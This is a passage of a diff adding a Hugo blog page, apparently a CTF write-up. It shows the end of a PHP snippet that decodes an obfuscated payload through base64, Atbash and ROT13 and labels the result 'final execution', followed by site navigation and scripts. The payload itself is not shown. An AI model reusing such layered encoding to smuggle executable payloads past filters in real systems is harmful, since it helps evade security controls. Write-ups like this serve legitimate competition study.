+</span></span><span class="line"><span class="cl"><span class="c1">// 验证过程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== 验证过程 ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test1</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Base64解码: </span><span class="si">$test1\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test2</span> <span class="o">=</span> <span class="nx">atbash</span><span class="p">(</span><span class="nv">$test1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Atbash加密: </span><span class="si">$test2\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test3</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$test2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;去除空格: </span><span class="si">$test3\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test4</span> <span class="o">=</span> <span class="nx">str_rot13</span><span class="p">(</span><span class="nv">$test3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;ROT13加密: </span><span class="si">$test4\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;最终执行: </span><span class="si">$test4\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2025ctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025?CTF</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-0xgame/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-0xgame</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/9-19awd/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">9-19awd</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cc3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cc3</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-春秋长城杯</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
